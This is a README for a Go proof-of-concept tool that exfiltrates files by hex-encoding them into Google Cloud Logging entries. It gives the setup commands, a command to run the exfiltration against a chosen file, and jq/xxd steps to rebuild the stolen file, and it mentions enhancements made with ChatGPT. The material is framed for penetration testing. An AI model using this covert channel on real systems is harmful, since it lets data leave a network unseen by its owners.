  
## Usage
Proof of concept data exfil binary files to cloud logging via hex string
Dennis Chow dchow[AT]xtecsystems.com March 26, 2023
No expressed warranty or liability.

## New
I pair programmed with ChatGPT v4 using the preview. Lots of enhancements including the 256KB quota limitation per payload entry in GCP along with dynamic labeling each chunk as its uploaded and changing the logName so you're not confused when using multiple files and which order you need to reconstruct back on the jq and xxd side of the house. My OLD mostly original code is under main.old and you can see main.rev1 as a intermediate area where ChatGPT started enhancing the code.

Dependencies and environment setup

    go init gologexfil/main && go get cloud.google.com/logging

Usage: 
`go run main.go --service-cred <YOUR-ACC-CRED.json> --project-id <YOUR-GCP-PROJECTID> --exfil-file <PATH/TO/FILE.foo>`

Note: In pen testing do a go build first go build -o gologexfil ./main.go ensure you have already go get cloud.google.com/logging

Retrieve your file in GCP Cloud Logging either by console and dump to file e.g. cat dump.txt | xxd -r -p > somefile.ext

Alternatively use jq e.g.:

    jq -r '.[] | {textPayload} | select(.textPayload != null) | .textPayload' ./downloaded-logs.json > payload-hexdump.text

